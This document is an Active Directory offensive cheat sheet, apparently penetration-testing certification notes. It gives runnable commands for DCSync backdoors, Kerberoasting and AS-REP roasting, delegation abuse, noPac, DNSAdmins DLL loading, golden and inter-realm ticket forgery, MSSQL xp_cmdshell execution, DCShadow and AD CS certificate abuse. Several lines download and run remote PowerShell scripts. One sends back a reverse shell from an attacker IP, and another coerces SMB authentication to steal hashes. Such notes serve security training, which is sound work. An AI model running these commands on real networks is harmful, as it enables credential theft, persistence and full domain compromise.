#### Domain Replication Privileges 
Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) to an arbitrary user 

https://adsecurity.org/?p=1729

```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView

```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module


# Persistence Using ACLs - Security Descriptors


#### Remote WMI - Nishang
link to Nishang- https://github.com/samratashok/nishang/tree/master/Backdoors

```
. .\Set-RemoteWMI.ps1

Set-RemoteWMI -UserName Josh -ComputerName dc01.ecorp.lab -namespace 'root\cimv2' -Verbose
```
```
gwmi -class win32_operatingsystem -ComputerName dc01.ecorp.lab
```


#### PS Remoting
link to Nishang - https://github.com/samratashok/nishang/tree/master/Backdoors

```
. .\Set-RemotePSRemoting.ps1

Set-RemotePSRemoting -UserName Josh -ComputerName dc01.ecorp.lab -Verbose
```

Note: It may throw an error, check access anyway


#### Remote Registry - DAMP
link to DAMP - https://github.com/HarmJ0y/DAMP

https://posts.specterops.io/remote-hash-extraction-on-demand-via-host-security-descriptor-modification-2cf505ec5c40

```
. .\DAMP-master\Add-RemoteRegBackdoor.ps1

Add-RemoteRegBackdoor -ComputerName dc01.ecorp.lab -Trustee Josh -Verbose
```

```
. .\DAMP-master\RemoteHashRetrieval.ps1

Get-RemoteMachineAccountHash -ComputerName dc01.ecorp.lab -Verbose
```


# Kerberoasting
#### Individual SPN targeting
```setspn -T domain -Q */*```

```Get-DomainUser –SPN```

OR ActiveDirectory module:

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```


#### Get SPN
```Get-DomainSPNTicket -SPN MSSQLSvc/dbsrv01.ecorp.lab```

```“HTTP/websrv01.ecorp.lab”,“HTTP/websrv02.ecorp.lab” | Get-DomainSPNTicket```

```Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat JTR```

OR

```Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityTok en -ArgumentList "MSSQLSvc/dbsrv01.ecorp.lab"```
#### Check and Dump Tickets

```klist```

Export all tickets using Mimikatz:

```Invoke-Mimikatz -Command '"kerberos::list /export"'```


#### Invoke-Kerberoast
https://blog.harmj0y.net/powershell/kerberoasting-without-mimikatz/

```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
```

```Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII Output_TGSs```

#### Impacket

```
GetUserSPNs.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DOMAIN_CONTROLLER_IP -outputfile Output_TGSs
```

#### Rubeus
https://blog.harmj0y.net/redteaming/kerberoasting-revisited/

```.\Rubeus.exe kerberoast```

optional:
- ```/spn:```
- ```/tgtdeleg``` - used to perform the tgt delegation trick to roast all rc4 enabled accounts
- ```/aes``` - roast all AES enabled accounts while using KerberosRequestorSecurityToken
- ```/creduser:domain\Administrator``` and ```/credpassword:``` - Alternate domain credentials

- ```/simple /nowrap``` - hashes are output in the console one per line &&  results will not be line wrapped
- ```/outfile:hash.txt``` 

[Rubeus](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus)

* * *

#### Crack SPN Hashes

https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py

Crack the Service account password:

``` 
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-
40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi

```

OR using John:
```john krbdump.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ```

* * *

# Targeted Kerberoasting - AS-REPs
https://harmj0y.medium.com/roasting-as-reps-e6179a65216b

```Get-DomainUser -PreauthNotRequired -Verbose```

OR using ActiveDirectory module:

```Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} - Properties DoesNotRequirePreAuth```

* * *

OR Find-InterestingDomainAcl shows us all interesting ACLs modifiable by the current user:

```Find-InterestingDomainAcl -ResolveGUIDs | select ObjectDN,ActiveDirectoryRights,IdentityReferenceName```

```Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll"}```

```Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```

* * *

#### Get AS-REPs

```.\Rubeus.exe asreproast```

optional:

- ```/domain:``` - specify domain/dc
- ```/dc:```

- ```/format:hashcat```
- ```/outfile:```

[Rubeus](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#rubeus)

#### Impacket
OR Impacket:-

```
GetNPUsers.py $DOMAIN/$DOMAIN_USER:$PASSWORD -dc-ip $DOMAIN_CONTROLLER_IP -outputfile Output_TGSs
```

#### Cracking hashes

```./john vpn1user.txt --wordlist=wordlist.txt```

```john asrepdump.txt --wordlist=/usr/share/wordlists/rockyou.txt```

* * * 

#### Disabling Pre-Auth

```Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose```

```Get-DomainUser -PreauthNotRequired -Verbose```

* * * 

# Privilege Escalation - Target a User via Kerberoasting Set-SPN

```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```

Check if the user already has an SPN:

```Get-DomainUser -Identity supportuser | select serviceprincipalname```

OR using ActiveDirectory module:

```Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName```

#### Set arbitrary SPN for user

•  Set an SPN for the user (must be unique for the domain):

```Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}```

OR using ActiveDirectory module:

Set-ADUser -Identity support1user -ServicePrincipalNames @{Add='ops/whatever1'}

#### Request a TGS now the user has an SPN 

```
Add-Type -AssemblyNAme System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityTok en -ArgumentList "ops/whatever1"
```

OR 

```Get-DomainSPNTicket -SPN ops/whatever1```

#### Check, export, and crack the ticket
```klist```

```Invoke-Mimikatz -Command '"kerberos::list /export"'```

```
python.exe .\tgsrepcrack.py .\10k-passwords.txt '.\2-
40a10000-student1@ops~whatever1- dollarcorp.moneycorp.LOCAL.kirbi'
```

* * *

# Kerberos Delegation
A Service which requires authentication from the user to access a subsequent service (e.g., a user accessing a SQL database via an HTTP service). In this case delegation is required and the first service (HTTP) will impersonate the user to authenticate to the second service (SQL). This is achieved by enclosing the users TGT within the TGS which is encrypted with the hash of the service account.

Basically this means if we have compromised a service account/machine and a Domain Admin connects, we are able to obtain their TGT as it is embedded inside the Delegated TGS Ticket. 

Once the delegated TGS is received by the service machine/account with Delegation enabled, the enclosed user TGT is extracted and stored in the machine’s lsass process. This means if we have localadmin on the service machine, we can obtain this TGT by dumping creds.

https://adsecurity.org/?p=1667

https://blog.harmj0y.net/redteaming/another-word-on-delegation/

# Unconstrained Delegation

NOTE: Domain Controllers will always report as having delegation enabled.

#### Find Machines with Unconstrained Delegation
```Get-DomainComputer -UnConstrained```

OR Using ActiveDirectory module:

```Get-ADComputer -Filter {TrustedForDelegation -eq $True}```

```Get-ADUser -Filter {TrustedForDelegation -eq $True}```

#### Compromise the server(s) where unconstrained delegation is enabled 
```Enter-PSSession -ComputerName appsrv01```

```Find-LocalAdminAccess```

```Invoke-UserHunter -ComputerName appsrv01 -Poll 100 -UserName Administrator -Delay 5 -verbose```

#### Dump creds 
See if theres any interesting accounts already resident in lsass:

```Invoke-Mimikatz –Command '"sekurlsa::tickets"'```

We must trick or wait for a domain admin to connect to a service on the compromised host and then dump the creds:

```Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'```

#### PTT
We can then reuse the DA token:

```
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user1\[0;2ceb8b3]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```


# Printer bug - why wait when you can spool
https://github.com/leechristensen/SpoolSample

compiled binary available here - [Tool dump](https://github.com/conma293/mvp) 

```dir \\dc01\pipe\spoolss```

```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/exploitation/Invoke-SpoolSample.ps1")
```

```Invoke-SpoolSample DC01 WebSrv_ownd```

#### PetitPotam
If you got no printer you can try this one:
https://github.com/topotam/PetitPotam


* * *

#### Rubeus Unconstrained Delegation Attack Flow with SpoolSample
```Get-NetComputer -UnConstrained```

```
Rubeus triage
Rubeus monitor /interval:5 /filteruser:dc01$ /nowrap
SpoolSample DC01 WebSrv_ownd
Rubeus ptt /ticket:
```
* * *

# Constrained Delegation
This is when a TGS with an embedded TGT for the authenticating user can be forwarded only to the specified service(s) defined in the User/Machine object's *msds-allowedtodelegateto* property.

It also introduces ```s4u``` - which allows a Service to request a TGS for itself on behalf of a user who may or may not be authenticating via Kerberos.

**Note:** Whats important here is that unlike unconstrained delegation, we dont need a user to access the delegating machine for this attack flow to work, as the service object can request a TGS for itself on behalf of an arbitrary user without that users interaction.

```Get-DomainUser –TrustedToAuth```

```Get-DomainComputer –TrustedToAuth```

```Get-DomainUser Bob -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto```

```Get-DomainComputer WEBSRV01 | Select name,serviceprincipalname,msds-allowedtodelegateto```

Or using ActiveDirectory module:

```Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo```

* * *
There are three steps in this attack flow ```TGT -> TGS -> Delegated TGS (with victim TGT inside)``` achieved by Rubeus with 2 distinct commands -

1) get the TGT for the SERVICE Machine/User Account
2) Run Rubeus ```s4u``` to impersonate the user whose idenity we wish to steal with ```/impersonateuser:```, and making sure to set the correct ```/msdsspn:``` as defined in the service account ```msds-allowedtodelegateto``` property.
* * *


#### Rubeus S4U - constrained delegation user 


#### Requesting an initial User or MachineAccount (possessing constrained delegation) TGT:
Use ```/outfile:``` or ```/nowrap``` if copy pasting - 
 
```Rubeus.exe asktgt /domain:ecorp.lab /user:webadmin /rc4:cbdc389e6f34c671fadb1b13edbc5a61 /outfile:C:\Temp\webtgt.kirbi```

#### Using S4U and the previous TGT, request a delegated TGS by specifying the msDS-AllowedToDelegateTo Service:

Rubeus (optional ```/domain``` ```/dc``` ; and ```/ptt```):

```Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:high_priv_user /msdsspn:ServiceListedIn{msDS-AllowedToDelegateTo} /ptt```

* * * 

#### Example self chain:

```Rubeus.exe tgtdeleg /nowrap```
https://github.com/GhostPack/Rubeus#tgtdeleg

```
Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab /dc:dc01.ecorp.lab /ptt
```

```klist```

* * *

#### Rubeus S4U - constrained delegation machine

We could also just do it all in one command - Rubeus does all the steps for us!

_in possession of constrained delegation machine account NTLM hash:_

```
Rubeus.exe s4u /user:WEBSRV01$ /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:DAdmin /msdsspn:cifs/dc01.ecorp.lab /ptt
```

**"If a ```/user``` and ```rc4/aes256``` hash is supplied, the ```s4u``` module performs an ```asktgt``` action first, using the returned ticket for the steps following. If a TGT ```/ticket:X``` is supplied, that TGT is used instead."**
-https://github.com/GhostPack/Rubeus#s4u

* * *
#### Rubeus S4U - Alternative Service
There is also a possiblity of requesting a TGS for more services than is specified in {msDS-AllowedToDelegateTo} IF there is no SNAME validation:

```
Rubeus.exe s4u /ticket:adminsrv$_LOCALxxx.kirbi /impersonateuser:Administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab|ldap/dc01.ecorp.lab
```

You can save both tickets to disk or output-String, and import the one you want to impersonate i.e., LDAP. 
OR inject straight into memory using ```/altservice:``` and ```/ptt```

**NOTE:** This will ONLY work if the msdspn service FQDN is able to be used by both i.e., NOT ending in a port e.g., ```CE01/SQLDatabase.ecorp.lab:1337``` - this will NOT work!
```
.\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/dc01.ecorp.com /altservice:CIFS /ptt
```

* * * 

Inject PTT:

``` Invoke-Mimikatz -Command '"kerberos::ptt C:\Windows\System32\TGS_<snip>_.kirbi"' ```

OR

``` Rubeus.exe ptt /ticket:C:\Windows\System32\TGS_LDAP_adminsrv$<snip>_.kirbi ```
* * *

# Resource-Based Constrained Delegation
In Resource-Based Constrained Delegation (RBCD) it is the backend service which sets the delegation parameters for the frontend service in the form of a SID in its _msDS-AllowedToActOnBehalfOfOtherIdentity_ property.

To abuse RBCD we need write privileges on a server so we can set the _msDS-AllowedToActOnBehalfOfOtherIdentity_ property to that of a SID for a Computer object (with an SPN) that we control.

For the computer object we can simply create a new machine account (with SPN), identify the corresponding SID, set that in the writable Server's _msDS-AllowedToActOnBehalfOfOtherIdentity_ property, and then run ```Rubeus s4u``` as we did for constrained delegation.

Check whether a user account object can create a new machine account (each can create 10 new machine accounts by default): ```Get-DomainObject -Identity Bob -Properties ms-DS-MachineAccountQuota```

**Note:** The most important thing to understand here is unlike unconstrained/constrained delegation, we dont need prior access to the machine. All we need is write privileges in the form of an appropriate ACL ("Owner" "WriteProperty" "GenericWrite") on ANY computer object. We can then set the _msDS-AllowedToActOnBehalfOfOtherIdentity_ property to a SID that we control (any domain account account that has an SPN i.e., a machine account we can create).

Therefore if we have ```"Owner"``` ```"WriteProperty"``` or ```"GenericWrite"``` permissions to ANY computer object within an environment, we can attain localadmin on that machine by way of RBCD.

search for writable server:
```
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```


create machine account (with powermad) and run s4u:
```
. .\PowerMad.ps1

New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'Password01' -AsPlainText -Force) -Verbose

$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

Rubeus.exe hash /password:'p@ssword!'

Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/WritableTargetMachine.wtver.domain /domain:wtver.domain /ptt
```

optional verify amended property:

```
$RawBytes = Get-DomainComputer "target_computer" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 
$Descriptor.DiscretionaryAcl
```

**NOTE:** In Constrained and Resource-Based Constrained Delegation if we don't have the password/hash of the account with TRUSTED_TO_AUTH_FOR_DELEGATION that we try to abuse, we can use the very nice trick "tgt::deleg" from kekeo or "tgtdeleg" from rubeus and fool Kerberos to give us a valid TGT for that account. Then we just use the ticket instead of the hash of the account to perform the attack.

-https://github.com/In3x0rabl3/OSEP/blob/main/osep_reference.md#pass-the-hash--cme--impacket--nc

* * * 

# noPac
#### Using new machine to create DC$ name search order attack to get DA
You can also create a new machine account, request a TGT, then remove the SPN and rename the same as a Domain Controller without the ```$``` - if vulnerable the Domain controller will research all machine names appending the ```$``` and will grant a TGS with permissions of the DC to your rogue DC-named machine account!

https://4sysops.com/archives/exploiting-the-cve-2021-42278-samaccountname-spoofing-and-cve-2021-42287-deceiving-the-kdc-active-directory-vulnerabilities/


Create a machine account:

```. .\PowerMad.ps1```

```New-MachineAccount -MachineAccount PC01 -Domain ecorp.lab -DomainController dc.ecorp.lab -Verbose```

OR 

```New-MachineAccount -MachineAccount PC01 -Password $(ConvertTo-SecureString 'Password01' -AsPlainText -Force)```

Clear SPN of the machine account:

```Set-DomainObject "CN=PC01,CN=Computers,DC=ecorp,DC=lab" -Clear 'serviceprincipalname' -Verbose```

_Because you have the "creator owner" access in Active Directory for that object, you can change the sAMAccountName attribute's property. Run the command below to modify that attribute to be the same as that of the domain controller name (without the $)._

Modify the sAMAccountName attribute:

```Set-MachineAccountAttribute -MachineAccount PC01 -Value "DC" -Attribute sAMAccountName  -Verbose```

Rubeus now requests a TGT token with the faked sAMAccountName as the username and password provided during the computer object creation process. Kerberos validates the request and provides a TGT token that can be used later:

```.\Rubeus.exe asktgt /user:DC /password:Password01 /domain:ecorp.lab /dc: dc.ecorp.lab /nowrap```

Now set your machine account back and ask for a TGS:

```Set-MachnineAccountAttribute -MachineAccount PC01 -Value 'PC01$' -Attribute 'samaccountname' -Verbose```

ask for a TGS using S4U and the previously stored ticket:

```.\Rubeus.exe s4u /ticket:... /msdsspn::ldap\dc.ecorp.lab /ptt```

because it cant find the user 'DC' as described in the ticket, it will look again, find DC$ (itself) and issue a valid TGS with the DC$ perms i.e., DA for all as we asked for LDAP krbtgt service.

* * * 

# DNS Admins
https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83

It is possible for the members of the DNSAdmins group to load arbitrary DLLs with the privileges of dns.exe (SYSTEM).
Often the DC also serves as the DNS, meaning we have a pathway to the DC and Domain Admin accounts.

BUT - we also need DNSAdmins members to be able to restart the DNS service which is not enabled by default..

Enumerate the members of the DNSAdmins group:

```Get-NetGroupMember -GroupName "DNSAdmins"```

Using DNSServer module (needs RSAT DNS):

```dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll```

```$dnsettings = Get-DnsServerSetting -ComputerName dcorp-dc -Verbose -All```

```$dnsettings.ServerLevelPluginDll = "\\172.16.50.100\dll\mimilib.dll"```

```Set-DnsServerSetting -InputObject $dnsettings -ComputerName dcorp-dc -Verbose```


# Forests and Trusts
```nltest /trusted_domains```
```Get-DomainTrust -NET```
```Get-DomainTrust -API```

Trusted Domain Object (TDO) properties:
```Get-DomainTrust```

A Forest is the Security Boundary as defined by MS.

Across Domains - Implicit Trust

Across Forests - Trust needs to be established

When requesting services from other domains - the TGT is Requested and received from the DC within the current users domain, the TGS corresponding to a service outside of the current domain is then Requested to the same DC, and an Inter-Realm TGT is provided in response. In possession of the Inter-realm TGT, a TGS for the service is requested from that other domain's DC wherein the service resides. This TGS is then presented directly to the cross-domain service machine.

The Inter-realm TGT is encrypted with the trust key which if compromised, can be reused to forge cross-domain tickets. A Trust key allows Domain Controllers to decrypt user TGTs without needing the krbtgt hash of the corresponding domain.

Essentially if you own DA on any Domain within a Forest, you own every domain within that forest as well as the Forest root itself. This is intended by design as the Forest is the security boundary defined by MS.

https://adsecurity.org/?p=1588

https://blog.harmj0y.net/redteaming/the-trustpocalypse/

https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d

https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/

https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1

* * * 

#### Child to Parent - Intra-Forest Trust
When trusts are created between domains a 'Trust Account' is created on either side, the NTLM hash of this is the _Trust Key_. Similar to the krbtgt account within individual domains. 

Therefore within the domain from the perspective of ```laptop01.ecorp.bcorp.lab``` there are two trust accounts - ```ecorp$``` and ```bcorp$``` - both of which have the same password and NTLM Hash which is the _Trust Key_

If we get the trust key we can forge an Inter-realm TGT and traverse domains. There are multiple ways to achieve this once in possession of DA prvileges:

Dump the Trust Key:
```Invoke-Mimikatz -Command '"lsadump::trust /patch"'```
OR
```lsadump::dcsync /domain:ecorp.bcorp.com /user:ecorp$```

Dump the krbtgt:
```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:ecorp.bcorp.lab /user:ecorp\krbtgt"'```


We are looking for the **IN** Trust key (from external to current domain), and can then inject this into memory using ```/rc4:``` OR ```/krbtgt:```

We also need to know the SID for both domains which can be found in numerous ways but most easily with Powerview:
```Get-DomainSID -Domain ecorp.bcorp.lab``` and ```Get-DomainSID -Domain bcorp.lab```

```/sids:``` is the (extra) SID(s) of the Parent domain and the static Enterprise Admins RID ```-519```

You can save them as below or inject directly into memory with ```/ptt```

trust tkt -
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /rc4:f052addf1d43f864a7d0c21cbce440c9 /service:krbtgt /target:parent.lab /ticket:C:\Temp\trust_tkt.kirbi"'
```

krbtgt -
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.lab /sid:S-1-5-21-<currentdomainSID> /sids:S-1-5-21-<parentdomainSID>-519 /krbtgt:f052addf1d43f864a7d0c21cbce440c9 /ticket:C:\Temp\krbtgt_tkt.kirbi"'
```

* * *

#### Unconstrained Printer Forestry
You can also use exactly the same printer bug trick as before, but making the machine account of the Forest ROOT domain controller to connect to the previously compromised Web Server in the child domain.

```
Rubeus triage
Rubeus monitor /interval:5 /filteruser:rdc-01$ /nowrap
SpoolSample RDC-01.bcorp.lab WebSrv_ownd
Rubeus ptt /ticket:
```

The machine account of the Root Domain Controller is not a localadministrator account socannot directly achieve code execution on the Root-DC. However, a DC Machine account _does_ have the rights to force a domain replication:

```lsadump::dcsync /domain:bcorp.lab /user:bcorp\administrator ```

This gives us the NTLM hash of the Root Domain Administrator account and access to the Enterprise Admins group.


Note: if you have privs you can turn a machine into unconstrained delegation by setting the ACL to perform this attack!
* * *

#### Across Forests - Inter-Forest Trust

```Get-DomainTrustMapping```

```Get-DomainUser -Domain externalnet.com```

```Get-DomainForeignGroupMember -Domain externalnet.com```

There is SID filtering across forests so abusing SID history to force ```/-519``` for Enterprise Admins will not work when abusing external forest trusts. Other than that it is the same:

```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:external.local /ticket:C:\Temp\trust_forest_tkt.kirbi"'
```

We can then request a TGS for any service located within the External Forest having established trust:

```.\Rubeus asktgs C:\Temp\trust_forest_tkt.kirbi CIFS/dc01.external.local```



Or find a high value RID >1000 to avoid SID filtering e.g., - ```Get-DomainGroupMember -Identity "Administrators" -Domain externalnet.com```

```
kerberos::golden /user:adminz /domain:externalnet.com /sid:S-1-5-21-1095350385-1831131555-2412080359 /krbtgt:cd3fb1b0b49c7a56d285ffdbb1304431 /sids:S-1-5-21-4182647938-3943167060-1815963754-1106 /ptt
```


* * *

You can also achieve this "_by querying the FOREIGN_DOMAIN_SHORTNAME$ account_": 

-https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d


```Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:SUB$"'```

* * *
#### Transitive and Shortcut Trusts, Pepe Silvia, and Enterprise Admins. 
https://www.youtube.com/watch?v=S5Glfe6UeXQ

Enterprise Admin = Domain Admin of every Domain in the Forest



* * * 

# MS SQL
#### Enumerate

```setspn -T domain -Q MSSQLSvc/*```

```Get-SQLInstanceDomain```

```Get-SQLConnectionTest -Instance "sql-02.ecorp.lab,1433" | fl```
```Get-SQLServerInfo -Instance "sql-02.ecorp.lab,1433"```

```Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose |fl```
```Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose```

```Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo```

#### Crawl Database Links
```Get-SQLServerLink -Instance dcorp-mssql -Verbose```

Or

```select * from master..sysservers```

Now - 

```Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose```


#### Code Execution
Turn xp_cmdshell on:
```EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"```

OR

```EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;```


now rce - 

```Get-SQLServerLinkCrawl -Instance db01-mssql  -Query "exec master..xp_cmdshell 'whoami'"```

OR via SQL:

```
select * from openquery("db01-mssql",'select * from openquery("db-mgmt",''select * from openquery("externalnet-mssql",''''select @@version as version; exec master..xp_cmdshell "powershell whoami)'''')'')')
```

send back a shell:

```
Get-SQLServerLinkCrawl -Instance db01-mssql.ecorp.bcorp.lab -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcp.ps1'')"'
```

#### PrivEsc 

use ```xp_dirtree``` to force the sqldb to connect to an smb share we control snd steal the hash with responder:

```EXEC master..xp_dirtree \"\\\\192.168.3.25\\\\test\```

```sudo responder -I eth0```

crack with hashcat:

```hashcat -m 5600 hash.txt dict.txt```

or use impacket ntlmrelayx to relay pth

#### execute as

```
EXECUTE AS LOGIN = 'sa';

use msdb; EXECUTE AS USER = 'dbo';
```


# Forest Persistence - DCShadow
```Set-DCShadowPermissions```

```# lsadump::dcshadow /object:rootXuser /attribute:servicePrincipalName /value:"DCReplication/DCX"```

```lsadump::dcshadow /push```

# Certificates
https://blog.harmj0y.net/activedirectory/certified-pre-owned/

https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d

https://github.com/GhostPack/Certify


```./certify.exe```


ESC1 - ESC10

ESC1 in particular is everywhere

_A Subject Alternative Name (SAN) is an extension that allows additional identities to be bound to a certificate beyond just the subject of the certificate._

_By default during certificate-based authentication, certificates are mapped to Active Directory accounts based on a user principal name (UPN) specified in the SAN._

_So, if an attacker can specify an arbitrary SAN when requesting a certificate that enables domain authentication, and the CA creates and signs a certificate using the attacker-supplied SAN, the attacker can become any user in the domain!_

- kind of similar to alternate service in constrained delegation vut fir a user - gimme a cert for this user account object thats authorised, and add this one too while your at it.

_Domain escalation scenarios can result from various AD CS template misconfigurations that allow unprivileged users to supply an arbitrary SAN in a certificate enrollment._

#### certify.exe

```Certify.exe find /clientauth``` -  will query LDAP for available templates that we can examine for our desired criteria:

```Certify.exe request /ca:dc.ecorcp.com\ecorp-dc-ca /template:user```

```./Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\hi.pfx /password:Password01```

#### ESC1-10

ESC1 is best as it allows arbitrary alt user in the SAN. popular default user or machine/computer template?

ESC4 - and you can even make your own! - _we have seen in multiple environments is Domain Computers having FullControl or WriteDacl permissions over a certificate template’s AD object_

ESC6 - even better is the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. As Microsoft describes, “If this flag is set on the CA, any request (including when the subject is built from Active Directory®) can have user defined values in the subject alternative name.” _This means that ANY template configured for domain authentication that also allows unprivileged users to enroll (e.g., the default User template) can be abused to obtain a certificate that allows us to authenticate as a domain admin_  RIP DEAD XX

ESC 7more yummy permissions to achieve this - ManageCA (aka “CA Administrator”) and ManageCertificates (aka “Certificate Manager/Officer”) permissions.

ESC8 web enrollment ca and spoolsample


#### Example flags to look for after running certify

```ENROLLEE_SUPPLIES_SUBJECT``` (ESC1)

ManageCA means set ```EDITF_ATTRIBUTESUBJECTALTNAME2``` (ESC7)

Full Control means set ```CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT``` and remove the ```PEND_ALL_REQUESTS``` issuance requirement (ESC4)


#### Attack flow

```./certify.exe find /vulnerable```

```Certify.exe request /ca:dc.ecorcp.com\ecorp-dc-ca /template:user```

```./Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\hi.pfx /password:Password01```

# LAPS
```Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName```


